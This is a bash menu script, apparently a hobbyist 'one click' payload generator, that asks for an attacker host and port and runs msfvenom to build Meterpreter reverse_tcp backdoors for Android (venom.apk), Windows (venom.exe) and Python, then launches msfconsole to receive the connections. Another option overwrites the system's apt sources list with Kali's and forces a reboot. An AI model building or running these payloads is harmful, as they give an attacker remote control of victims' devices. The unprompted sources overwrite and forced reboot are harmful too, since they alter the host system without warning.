#!/bin/bash
clear
function toolBanner() {
	printf "\e[0;35m                     _ _     _    \e[0m\n"
	printf "\e[0;35m  ___ ___ ___    ___| |_|___| |_  \e[0m\n"
	printf "\e[0;35m | . |   | -_|  |  _| | |  _| '_| \e[0m\n"
	printf "\e[0;35m |___|_|_|___|  |___|_|_|___|_,_| \e[0;37m1.4v\e[0m\n"
	printf "\n\e[0;37m  By Evin      My Telegram : spynot0 \e[0m\n"
	echo
}
toolBanner

printf '\n[1] Payload Android\n\n'
printf '[2] Payload Windows\n\n'
printf '[3] Payload Python\n\n'
printf '[4] Update  Os\n\n'
printf '[5] Sources List\n\n'
printf '[99] exit\n\n'
printf '\n'
read -p '[+] TYPE NUMBER ---> : ' TEST
if [ $TEST == '1' ]
then
	clear
	function toolBanner() {
		printf "\e[0;35m                     _ _     _    \e[0m\n"
		printf "\e[0;35m  ___ ___ ___    ___| |_|___| |_  \e[0m\n"
		printf "\e[0;35m | . |   | -_|  |  _| | |  _| '_| \e[0m\n"
		printf "\e[0;35m |___|_|_|___|  |___|_|_|___|_,_| \e[0;37m1.4v\e[0m\n"
		printf "\n\e[0;37m  By Evin      My Telegram : spynot0 \e[0m\n"
		echo
	}
	toolBanner
	printf '\n'
	read -p '[+] LHOST ---> : ' h
	printf '\n'
	read -p '[+] LPORT ---> : ' p
	clear
	printf 'wait ... \n\n'
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$h LPORT=$p R > venom.apk 
	clear
	msfconsole
elif [ $TEST == '2' ]
then
	clear
	function toolBanner() {
		printf "\e[0;35m                     _ _     _    \e[0m\n"
		printf "\e[0;35m  ___ ___ ___    ___| |_|___| |_  \e[0m\n"
		printf "\e[0;35m | . |   | -_|  |  _| | |  _| '_| \e[0m\n"
		printf "\e[0;35m |___|_|_|___|  |___|_|_|___|_,_| \e[0;37m1.4v\e[0m\n"
		printf "\n\e[0;37m  By Evin      My Telegram : spynot0 \e[0m\n"
		echo
	}
	toolBanner
	printf '\n'
	read -p '[+] LHOST ---> : ' hwin
	printf '\n'
	read -p '[+] LPORT ---> : ' pwin
	clear
	printf 'wait ... \n\n'
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$hwin LPORT=$pwin R > venom.exe
	clear
	msfconsole
elif [ $TEST == '3' ]
then
	clear
	function toolBanner() {
		printf "\e[0;35m                     _ _     _    \e[0m\n"
		printf "\e[0;35m  ___ ___ ___    ___| |_|___| |_  \e[0m\n"
		printf "\e[0;35m | . |   | -_|  |  _| | |  _| '_| \e[0m\n"
		printf "\e[0;35m |___|_|_|___|  |___|_|_|___|_,_| \e[0;37m1.4v\e[0m\n"
		printf "\n\e[0;37m  By Evin      My Telegram : spynot0 \e[0m\n"
		echo
	}
	toolBanner
	printf '\n'
	read -p '[+] LHOST ---> : ' hpy
	printf '\n'
	read -p '[+] LPORT ---> : ' py
	clear
	printf 'wait ... \n\n'
	msfvenom -p python/meterpreter/reverse_tcp LHOST=$hpy LPORT=$py R > venom.py
	clear
	msfconsole
elif [ $TEST == '4' ]
then
	clear
	function toolBanner() {
		printf "\e[0;35m                     _ _     _    \e[0m\n"
		printf "\e[0;35m  ___ ___ ___    ___| |_|___| |_  \e[0m\n"
		printf "\e[0;35m | . |   | -_|  |  _| | |  _| '_| \e[0m\n"
		printf "\e[0;35m |___|_|_|___|  |___|_|_|___|_,_| \e[0;37m1.4v\e[0m\n"
		printf "\n\e[0;37m  By Evin      My Telegram : spynot0 \e[0m\n"
		echo
	}
	toolBanner
	printf '\n\n'
	printf 'wait ...'
	sleep 3
	clear
	printf '\n\n'
	sudo apt update && sudo apt update && sudo apt -y upgrade
	clear
	bash venom.sh
elif [ $TEST == '5' ]
then
	echo "deb http://http.kali.org/kali kali-rolling main non-free contrib" | sudo tee /etc/apt/sources.list
	sudo apt update && sudo apt -y full-upgrade
	cp -rbi /etc/skel/. ~
	[ -f /var/run/reboot-required ] && sudo reboot -f
	clear
	printf 'wait ...'
	sleep 2
	bash venom.sh
elif [ $TEST == '99' ]
then
	clear
fi
